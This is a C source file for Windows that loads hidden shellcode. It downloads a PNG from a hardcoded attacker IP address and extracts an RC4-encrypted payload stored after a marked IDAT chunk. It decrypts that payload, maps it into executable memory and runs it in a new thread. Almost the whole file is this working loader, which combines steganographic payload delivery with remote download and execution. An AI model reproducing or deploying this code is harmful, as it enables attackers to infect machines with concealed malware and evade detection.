#include <Windows.h>
#include <stdio.h>
#include "common.h"

// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------

#define RC4_KEY_SIZE		16
#define CHUNK_TYPE_SIZE		4
#define BYTES_TO_SKIP		33		// PNG signature (8) + IHDR header (21) + IHDR CRC (4)
#define PNG_SIGNATURE		0x474E5089	// 'GNP'0x89 
#define IEND_HASH		0xAE426082	// IEND section hash 

// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------

//
//
// TO UPDATE with respect to every new created PNG:
//
//
#define MARKED_IDAT_HASH	  0xC25031A4

// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------

// Structure for the RC4 context
typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;

// Function for RC4 decryption of PNG Payload contents
VOID Rc4EncryptDecrypt(IN PBYTE pInputBuffer, IN SIZE_T sInputBuffSize, IN PBYTE pRc4Key, IN SIZE_T sRc4KeySize, OUT PBYTE ppOutputBuffer) {

	// RC4 variables
	unsigned int		i = 0x00;
	unsigned int		j = 0x00;
	unsigned char* s = 0x00;
	unsigned char		temp = 0x00;
	Rc4Context		context = { 0 };

	context.i = 0;
	context.j = 0;

	for (i = 0; i < 256; i++)
		context.s[i] = i;

	// Key scheduling algorithm
	for (i = 0, j = 0; i < 256; i++) {

		j = (j + context.s[i] + pRc4Key[i % sRc4KeySize]) % 256;
		temp = context.s[i];
		context.s[i] = context.s[j];
		context.s[j] = temp;
	}

	i = context.i;
	j = context.j;
	s = context.s;

	// Decryption of the buffer
	while (sInputBuffSize > 0) {

		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		if (pInputBuffer != NULL && ppOutputBuffer != NULL) {
			*ppOutputBuffer = *pInputBuffer ^ s[(s[i] + s[j]) % 256];
			pInputBuffer++;
			ppOutputBuffer++;
		}

		sInputBuffSize--;
	}

	context.i = i;
	context.j = j;
}

// Function to extract the decrypted payload from the PNG file
BOOL ExtractDecryptedPayload(IN PBYTE pPngFileBuffer, IN SIZE_T sPngFileSize, OUT PBYTE* ppDecryptedBuff, OUT PSIZE_T psDecryptedBuffLength) {

	SIZE_T			Offset = BYTES_TO_SKIP,
		sDecPayloadSize = 0x00;
	DWORD			uSectionLength = 0x00;
	CHAR			pSectionType[CHUNK_TYPE_SIZE + 1] = { 0 };
	PBYTE			pRc4Key[RC4_KEY_SIZE] = { 0 };
	PBYTE			pSectionBuffer = NULL,
		pTmpPntr = NULL,
		pDecPayload = NULL;
	UINT32			uCRC32Hash = 0x00;
	BOOL			bFoundHash = FALSE;

	// Check if the input file is a PNG file
	if (*(ULONG*)pPngFileBuffer != PNG_SIGNATURE) {
		printf("[!] Input File Is Not A PNG File \n");
		return FALSE;
	}

	// Loop through the PNG file sections
	while ((SIZE_T)Offset < sPngFileSize) {

		// Fetch section size
		uSectionLength = (pPngFileBuffer[Offset] << 24) | (pPngFileBuffer[Offset + 1] << 16) | (pPngFileBuffer[Offset + 2] << 8) | pPngFileBuffer[Offset + 3];
		Offset += sizeof(DWORD);

		// Fetch section type 
		memset(pSectionType, 0x00, sizeof(pSectionType));
		memcpy(pSectionType, &pPngFileBuffer[Offset], CHUNK_TYPE_SIZE);
		Offset += CHUNK_TYPE_SIZE;

		// Fetch a pointer to the section's data
		pSectionBuffer = (PBYTE)(&pPngFileBuffer[Offset]);
		Offset += uSectionLength;

		// Fetch CRC32 hash
		uCRC32Hash = (pPngFileBuffer[Offset] << 24) | (pPngFileBuffer[Offset + 1] << 16) | (pPngFileBuffer[Offset + 2] << 8) | pPngFileBuffer[Offset + 3];
		Offset += sizeof(UINT32);

		printf("[i] Section: %s \n", (CHAR*)pSectionType);
		printf("\t> Buffer: 0x%p \n", pSectionBuffer);
		printf("\t> Length: %d \n", (int)uSectionLength);
		printf("\t> Hash: 0x%0.8X \n", uCRC32Hash);

		// End of the png file  
		if (uCRC32Hash == IEND_HASH)
			break;

		if (uCRC32Hash == MARKED_IDAT_HASH) {
			bFoundHash = TRUE;
			// The next iteration will be the start of our embedded payload
			continue;
		}

		if (bFoundHash) {

			// Fetch key
			memset(pRc4Key, 0x00, RC4_KEY_SIZE);
			memcpy(pRc4Key, pSectionBuffer, RC4_KEY_SIZE);

			// Modify pointer and size
			pSectionBuffer += RC4_KEY_SIZE;
			uSectionLength -= RC4_KEY_SIZE;

			// Create buffer to hold decrypted section
			if (!(pTmpPntr = LocalAlloc(LPTR, uSectionLength))) {
				printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
				return FALSE;
			}

			// Decrypt
			Rc4EncryptDecrypt(pSectionBuffer, uSectionLength, pRc4Key, RC4_KEY_SIZE, pTmpPntr);

			// Append decrypted data to total buffer (pDecPayload)
			sDecPayloadSize += uSectionLength;

			// Allocate memory for the decrypted payload
			if (!pDecPayload)
				pDecPayload = LocalAlloc(LPTR, sDecPayloadSize);
			else
				pDecPayload = LocalReAlloc(pDecPayload, sDecPayloadSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

			if (!pDecPayload) {
				printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
				return FALSE;
			}
			memcpy(pDecPayload + (sDecPayloadSize - uSectionLength), pTmpPntr, uSectionLength);

			// Free temp buffer
			memset(pTmpPntr, 0x00, uSectionLength);
			LocalFree(pTmpPntr);
		}
	}

	// Check if the hash was found
	if (!bFoundHash)
		printf("[!] Could Not Find IDAT Section With Hash: 0x%0.8X \n", MARKED_IDAT_HASH);

	*ppDecryptedBuff = pDecPayload;
	*psDecryptedBuffLength = sDecPayloadSize;

	return bFoundHash;
}

// Function to read a file from disk
BOOL ReadFileFromDiskA(IN LPCSTR cFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	DWORD		dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;
	PBYTE		pBaseAddress = NULL;

	// Check input
	if (!cFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	// Open file
	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Get file size
	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Allocate memory
	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Read file
	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer = pBaseAddress;
	*pdwFileSize = dwFileSize;

	// Error handler
_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}

// Function to do Local Mapping Injection of the payload
BOOL LocalMappingInjection(IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress) {

	HANDLE		hMappingFile = NULL;
	PBYTE		pMappingAddress = NULL;

	// Check input
	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	// Create a mapping file
	if (!(hMappingFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0x00, sShellcodeSize, NULL))) {
		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}
	printf("[i] Mapping File Created \n");

	// Map the file
	if (!(pMappingAddress = MapViewOfFile(hMappingFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0x00, 0x00, sShellcodeSize))) {
		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}
	printf("[i] Memory Mapped at: 0x%p \n", pMappingAddress);

	// Copy the shellcode to the mapped memory
	*ppInjectionAddress = memcpy(pMappingAddress, pShellcodeAddress, sShellcodeSize);

// Error handler
_END_OF_FUNC:
	if (hMappingFile)
		CloseHandle(hMappingFile);
	return (*ppInjectionAddress) ? TRUE : FALSE;
}

// ---------------------------------------------------------------------------------------------------------------------------------------------

BOOL fetchPayload() {

	PBYTE pPngFileBuffer = NULL;
	PBYTE pShellcodeBuffer = NULL;
	SIZE_T sPngFileSize = 0x00;
	SIZE_T sShellcodeSize = 0x00;

	printf("[i] Extracting Payload from PNG File \n");

	// URL of the PNG file
	LPCSTR url = "http://192.168.206.8/payload.png"; // Change ip as per attacker machine
	LPCSTR localFile = "payload.png";

	// Download the PNG file from the URL
	if (!DownloadFile(url, localFile)) {
		return -1;
	}

	// Read PNG file from disk
	if (!ReadFileFromDiskA("payload.png", &pPngFileBuffer, &sPngFileSize))
		return -1;

	// Extract decrypted payload from PNG file
	if (!ExtractDecryptedPayload(pPngFileBuffer, sPngFileSize, &pShellcodeBuffer, &sShellcodeSize))
		return -1;

	// Inject the shellcode into the local mapping
	printf("[i] Injecting Shellcode Into Local Mapped Memory \n");
	PBYTE pInjectionAddress = NULL;
	if (!LocalMappingInjection(pShellcodeBuffer, sShellcodeSize, &pInjectionAddress)) {
		printf("[!] LocalMappingInjection Failed With Error: %d \n", GetLastError());
		return -1;
	}

	// Create a thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pInjectionAddress, NULL, 0, NULL);
	if (!hThread) {
		printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
		VirtualFree(pInjectionAddress, 0, MEM_RELEASE);
		return -1;
	}

	// Wait for the shellcode to finish executing
	WaitForSingleObject(hThread, INFINITE);

	// Clean up
	CloseHandle(hThread);
	VirtualFree(pInjectionAddress, 0, MEM_RELEASE);
	return 0;
}